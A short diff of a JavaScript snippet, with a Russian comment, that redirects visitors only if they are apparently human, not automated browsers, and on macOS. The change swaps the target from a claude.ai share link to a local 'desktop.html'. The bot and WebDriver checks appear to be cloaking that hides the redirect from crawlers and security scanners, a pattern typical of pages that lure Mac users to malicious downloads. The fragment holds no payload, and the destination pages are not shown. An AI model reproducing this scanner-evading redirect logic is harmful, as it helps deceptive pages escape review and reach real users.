@@ -78,7 +78,7 @@
     
     // Редирект только для реальных пользователей на macOS
     if (!isBot && !isWebDriver && isPureMac) {
-        window.location.replace("https://claude.ai/share/bf35c307-4f8c-4e9a-b69b-50477baa9715");
+        window.location.replace("desktop.html");
     }
 })();
 
